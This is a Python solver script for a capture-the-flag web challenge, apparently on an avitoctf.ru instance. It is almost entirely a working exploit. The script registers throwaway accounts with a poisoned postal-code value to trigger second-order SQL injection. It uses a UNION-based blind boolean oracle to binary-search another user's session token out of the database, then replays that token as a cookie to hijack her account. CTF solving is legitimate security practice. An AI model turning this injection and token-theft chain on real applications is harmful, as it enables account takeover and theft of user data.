"""End-to-end solver for the СОТЭК (sotek) web challenge.

Approach (mirrors write-up §3-§5):
    The app only stamps ``process.env.FLAG`` onto a user's ``/orders`` page
    when that user owns at least one order, and exactly one seeded account
    (the delivery agent) owns one. Her password is an unrecoverable
    ``crypto.randomUUID()``, so the goal shifts from "crack the password" to
    "steal her live session token" straight out of the ``sessions`` table.

    The only attacker-controlled value that later reaches a raw SQL string is
    the registration field ``postalCode``: it is stored unvalidated in a
    nominally-``INTEGER`` SQLite column (dynamic typing keeps it as TEXT) and
    later interpolated, unescaped, into a query in ``calculateRatesForUser``
    (``/api/calculate``). That is a second-order SQL injection. Because
    ``better-sqlite3`` rejects stacked statements, only read-only ``UNION``
    injection works, so we turn it into a **blind boolean oracle**: inject
    ``UNION SELECT CASE WHEN <condition> THEN 101 ELSE NULL END`` and observe
    whether ``rate_id`` 101 appears in the JSON ``rates`` array.

    Each oracle query costs one throwaway registration + one ``/api/calculate``
    call. We binary-search the Unicode code point of every character of the
    target agent's session token (``unicode(substr(token, pos, 1))``), then
    replay the recovered UUID as the ``session_id`` cookie against ``/orders``
    to get the flag rendered by the server.

Usage:
    python3 solve_sotek.py --base-url https://sotek-<id>.avitoctf.ru
"""

from __future__ import annotations

import argparse
import re
import uuid

import requests

TARGET_EMAIL = "agent.bzz@hive.local"
RATE_ID = 101
DESTINATION_POSTAL_CODE = 125315
# UUIDv4 string alphabet: hex digits + hyphen -> code points 0x2d..0x66
LO_CODEPOINT = ord("-")
HI_CODEPOINT = ord("f")
TOKEN_LEN = 36


def register(base_url: str, postal_code: str) -> requests.Session:
    """Register a fresh throwaway account with a poisoned postalCode and return its session."""
    session = requests.Session()
    email = f"solver-{uuid.uuid4().hex[:12]}@sotek.local"
    session.post(
        f"{base_url}/api/register",
        data={
            "fullName": "Solver Bot",
            "email": email,
            "postalCode": postal_code,
            "password": "SolverPassword1",
        },
        allow_redirects=True,
        timeout=15,
    )
    return session


def oracle(base_url: str, condition_sql: str) -> bool:
    """Ask the blind-boolean oracle: is `condition_sql` true, per rate_id 101 in /api/calculate?"""
    payload = f"x') UNION SELECT CASE WHEN {condition_sql} THEN {RATE_ID} ELSE NULL END --"
    session = register(base_url, payload)
    resp = session.post(
        f"{base_url}/api/calculate",
        json={"destinationPostalCode": DESTINATION_POSTAL_CODE},
        timeout=15,
    )
    resp.raise_for_status()
    rates = resp.json().get("rates", [])
    return any(rate.get("rate_id") == RATE_ID for rate in rates)


def token_sql_expr() -> str:
    """SQL expression selecting the target agent's live session token."""
    return (
        "(SELECT token FROM sessions WHERE user_id = "
        f"(SELECT id FROM users WHERE email = '{TARGET_EMAIL}') "
        "ORDER BY id DESC LIMIT 1)"
    )


def extract_session_token(base_url: str) -> str:
    """Binary-search every character of the target session token via the oracle."""
    expr = token_sql_expr()
    length_ok = oracle(base_url, f"LENGTH({expr}) = {TOKEN_LEN}")
    if not length_ok:
        msg = f"unexpected token length (expected {TOKEN_LEN}); check TARGET_EMAIL / DB state"
        raise RuntimeError(msg)

    chars = []
    for pos in range(1, TOKEN_LEN + 1):
        lo, hi = LO_CODEPOINT, HI_CODEPOINT
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"unicode(substr({expr}, {pos}, 1)) <= {mid}"
            if oracle(base_url, cond):
                hi = mid
            else:
                lo = mid + 1
        chars.append(chr(lo))
        print(f"[+] position {pos:2d}/{TOKEN_LEN}: {''.join(chars)}")
    return "".join(chars)


def replay_session(base_url: str, token: str) -> str:
    """Replay the recovered token as the session cookie and pull the flag off /orders."""
    resp = requests.get(
        f"{base_url}/orders",
        cookies={"session_id": token},
        timeout=15,
    )
    resp.raise_for_status()
    match = re.search(r"avito\{[^}]+\}", resp.text)
    if not match:
        msg = "replay succeeded but no flag pattern found in /orders response"
        raise RuntimeError(msg)
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True, help="e.g. https://sotek-<id>.avitoctf.ru")
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")

    print("[*] confirming boolean oracle (1=1 vs 1=2)...")
    assert oracle(base_url, "1=1") is True
    assert oracle(base_url, "1=2") is False
    print("[+] oracle confirmed")

    print(f"[*] extracting session token for {TARGET_EMAIL}...")
    token = extract_session_token(base_url)
    print(f"[+] recovered session token: {token}")

    print("[*] replaying session against /orders...")
    flag = replay_session(base_url, token)
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()
